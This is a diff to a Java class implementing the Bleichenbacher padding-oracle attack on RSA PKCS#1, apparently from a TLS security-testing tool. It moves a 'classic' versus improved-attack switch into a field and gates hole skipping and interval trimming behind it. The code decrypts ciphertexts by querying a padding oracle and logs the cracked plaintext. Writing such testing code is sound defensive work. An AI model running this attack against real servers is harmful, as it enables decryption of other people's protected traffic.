@@ -50,6 +50,8 @@ public class Bleichenbacher extends Pkcs1Attack {
     private int innerTrimmers = 1500;
     private int outerTrimmers = 500;
 
+    private boolean classic = false;
+
     /**
      * @param msg The message that should be decrypted with the attack
      * @param pkcsOracle The oracle to be queried
@@ -288,27 +290,31 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         BigInteger s = lowerBound;
         boolean oracleResult;
+        BigInteger high = null, low = null, j = BigInteger.ONE;
 
-        BigInteger j = BigInteger.ONE;
-        // ceil(3*B+j*n,a)
-        BigInteger low = ceil(three_B.add(j.multiply(rsaPublicKey.getModulus())), M.get(0).lower);
+        if (!classic) {
+            // ceil(3*B+j*n,a)
+            low = ceil(three_B.add(j.multiply(rsaPublicKey.getModulus())), M.get(0).lower);
 
-        // ceil(2*B+(j+1)*n,b)-1
-        BigInteger high =
-                ceil(
-                        two_B.add((j.add(BigInteger.ONE).multiply(rsaPublicKey.getModulus()))),
-                        M.get(0).upper);
+            // ceil(2*B+(j+1)*n,b)-1
+            high =
+                    ceil(
+                            two_B.add((j.add(BigInteger.ONE).multiply(rsaPublicKey.getModulus()))),
+                            M.get(0).upper);
 
-        high = high.subtract(BigInteger.ONE);
+            high = high.subtract(BigInteger.ONE);
+        }
 
         while (true) {
-
-            if (j.compareTo(BigInteger.ZERO) > 0) {
-                BigInteger[] result = checkAndSkipS(s, j, low, high, rsaPublicKey, M.get(0));
-                s = result[0];
-                j = result[1];
-                high = result[2];
-                low = result[3];
+            // only skip holes in improved version
+            if (!classic) {
+                if (j.compareTo(BigInteger.ZERO) > 0) {
+                    BigInteger[] result = checkAndSkipS(s, j, low, high, rsaPublicKey, M.get(0));
+                    s = result[0];
+                    j = result[1];
+                    high = result[2];
+                    low = result[3];
+                }
             }
 
             BigInteger attempt =
@@ -348,8 +354,8 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /**
-     * Searches for a valid s-value as part of the paralle threats method from klima, pretending only
-     * one interval was found to search for the next s-value
+     * Searches for a valid s-value as part of the paralle threats method from klima, pretending
+     * only one interval was found to search for the next s-value
      *
      * @param lowerBound the lower bound for the possible s-values
      * @param upperBound the upper boud for the possible s-values
@@ -551,18 +557,18 @@ public class Bleichenbacher extends Pkcs1Attack {
     /** The function to start the Attack */
     public void attack(boolean classic) {
 
+        this.classic = classic;
+
         if (hostPublicKey.getModulus().bitLength() > serverPublicKey.getModulus().bitLength()) {
             byte[] cracked =
-                    nestedBleichenbacher(
-                            encryptedMsg, this.serverPublicKey, this.hostPublicKey, classic);
+                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
             LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
             byte[] cracked_decoded = pkcs1Decode(cracked);
             LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
             solution = new BigInteger(cracked_decoded);
         } else {
             byte[] cracked =
-                    nestedBleichenbacher(
-                            encryptedMsg, this.serverPublicKey, this.hostPublicKey, classic);
+                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
             LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
             byte[] cracked_decoded = pkcs1Decode(cracked);
             LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
@@ -582,8 +588,7 @@ public class Bleichenbacher extends Pkcs1Attack {
     private byte[] nestedBleichenbacher(
             byte[] ciphertext,
             CustomRsaPublicKey innerPublicKey,
-            CustomRsaPublicKey outerPublicKey,
-            boolean classic) {
+            CustomRsaPublicKey outerPublicKey) {
         int innerBitsize = innerPublicKey.getModulus().bitLength();
         int outerBitsize = outerPublicKey.getModulus().bitLength();
         int innerK = innerBitsize / 8;
@@ -595,7 +600,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        byte[] encoded_inner_ciphertext = Bleichenbacher(ciphertext, outerPublicKey, null, classic);
+        byte[] encoded_inner_ciphertext = Bleichenbacher(ciphertext, outerPublicKey, null);
         byte[] innerCiphertext = pkcs1Decode(encoded_inner_ciphertext);
 
         B = big_two.pow(8 * (innerK - 2));
@@ -604,7 +609,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        return Bleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey, classic);
+        return Bleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey);
     }
 
     private List<Interval> trimM0(
@@ -710,8 +715,7 @@ public class Bleichenbacher extends Pkcs1Attack {
     private byte[] Bleichenbacher(
             byte[] ciphertext,
             CustomRsaPublicKey innerPublicKey,
-            CustomRsaPublicKey outerPublicKey,
-            boolean classic) {
+            CustomRsaPublicKey outerPublicKey) {
 
         int innerBitsize = innerPublicKey.getModulus().bitLength();
         int innerK = innerBitsize / 8;
@@ -733,6 +737,8 @@ public class Bleichenbacher extends Pkcs1Attack {
                 "M lower: {} M upper: {}",
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
+
+        // only applie trimmes in improved run
         if (!classic) {
             int maxTrimmes = outerPublicKey != null ? innerTrimmers : outerTrimmers;
 
@@ -757,7 +763,19 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         while (true) {
             if (M.size() >= 2) {
-                s = step2b(M, s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
+
+                if (!classic) {
+                    s =
+                            step2b(
+                                    M,
+                                    s.add(BigInteger.ONE),
+                                    ciphertext,
+                                    innerPublicKey,
+                                    outerPublicKey);
+                } else {
+                    s = step2b(s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
+                }
+
             } else if (M.size() == 1) {
                 BigInteger a = M.get(0).lower;
                 BigInteger b = M.get(0).upper;
